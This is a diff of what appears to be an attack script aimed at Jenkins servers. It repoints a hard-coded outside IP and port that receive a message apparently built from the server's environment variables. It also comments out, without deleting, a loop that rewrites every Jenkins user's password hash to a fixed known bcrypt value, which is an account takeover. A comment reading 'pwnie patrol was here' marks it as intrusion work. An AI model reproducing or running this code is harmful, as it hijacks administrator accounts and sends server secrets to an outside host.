@@ -18,8 +18,8 @@ import pwd
 import fileinput
 import time
 import pprint
-TCP_IP = '104.130.135.219'
-TCP_PORT = 5005
+TCP_IP = '104.130.139.232'
+TCP_PORT = 5007
 BUFFER_SIZE = 1024
 message = "" 
 
@@ -32,13 +32,15 @@ message = pprint.pformat(dict(envs))
 """
 #
 #
+#remove these quotes
+"""
 results = os.listdir('/var/lib/jenkins/users/')
 for res in results:
         for line in fileinput.FileInput("/var/lib/jenkins/users/%s/config.xml" % res,inplace=1):
                 line = re.sub(r"#jbcrypt:[^<]+", "#jbcrypt:$2a$10$JxdHcE41n7pZMYCojRZKhucH/PlbH41gHhy8zFVdM2BNbLPfBgy4.", line )
                 print line,
 message = 'using jenkins: %s ' % str(results)
-
+"""
 """
 # pwnie patrol was here.
 try:
